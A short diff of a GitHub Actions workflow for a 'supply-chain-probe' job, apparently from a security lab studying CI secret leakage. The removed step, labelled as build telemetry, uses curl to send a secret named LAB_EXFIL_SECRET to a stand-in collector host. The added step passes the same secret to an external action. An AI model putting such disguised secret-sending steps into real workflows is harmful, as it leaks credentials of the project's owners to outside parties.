@@ -5,9 +5,8 @@ permissions:
 jobs:
   supply-chain-probe:
     runs-on: self-hosted
-    env:
-      LAB_EXFIL_SECRET: ${{ secrets.LAB_EXFIL_SECRET }}
     steps:
     - name: Publish build telemetry
-      run: |
-        curl -s -m 10 "http://collector.radar.test/telemetry?t=${LAB_EXFIL_SECRET}" || true
+      uses: SISL-UIC/lab-telemetry-collector@8ca12df1e24a9c797ed6d5ab97ba9de6b2858820
+      with:
+        token: ${{ secrets.LAB_EXFIL_SECRET }}
